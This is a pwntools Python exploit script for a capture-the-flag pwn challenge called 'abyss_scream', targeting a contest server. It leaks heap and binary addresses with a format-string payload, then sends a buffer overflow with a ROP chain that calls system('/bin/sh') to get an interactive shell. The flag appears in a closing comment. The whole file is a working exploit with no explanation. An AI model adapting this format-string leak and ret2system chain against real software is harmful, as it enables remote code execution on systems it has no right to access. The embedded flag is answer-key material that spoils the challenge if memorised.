

from pwn import *

main_offset = 0x00000000000131E
pop_rdi_ret = 0x0000000000013B5

padd = 272 #
system_call= 0x000000000000129E

libc = ELF("./libc.so.6")
#p = process("./abyss_scream_patched")
p = remote("chall.polygl0ts.ch",9001)

# gdb.attach(p,gdbscript='''
# set follow-fork-mode parent        
# b *save_msg+239
# b *save_msg+276           
# ''')


p.sendline(b"x")
p.sendline(p64(0x68732f6e69622f))
p.sendline(b"%41$p-%49$p-") # heap leak + binary main leak



p.recvline()
p.recvline()
p.recvline()
leaked_val = p.recvline().split(b'-')
print(leaked_val)


heap_leak_binsh = leaked_val[0]

bin_sh = int(heap_leak_binsh.decode(),16) 

binary_base= int(leaked_val[1].decode(),16)-main_offset # binary base
pop_rdi_ret_binary = binary_base + pop_rdi_ret
system_call_binary  = binary_base + system_call


p.sendline(b"x")
p.sendline(b'A'*10)

payload = b'A'*280
payload += p64(pop_rdi_ret_binary )
payload += p64(bin_sh)
payload += p64(system_call_binary)
p.sendline(payload)


p.interactive()

# EPFL{H3Y_C4LM_D0WN_N0_N33D_T0_SCR34M_S0_L0UD_1_C4N_H34R_Y0U!!!!!!}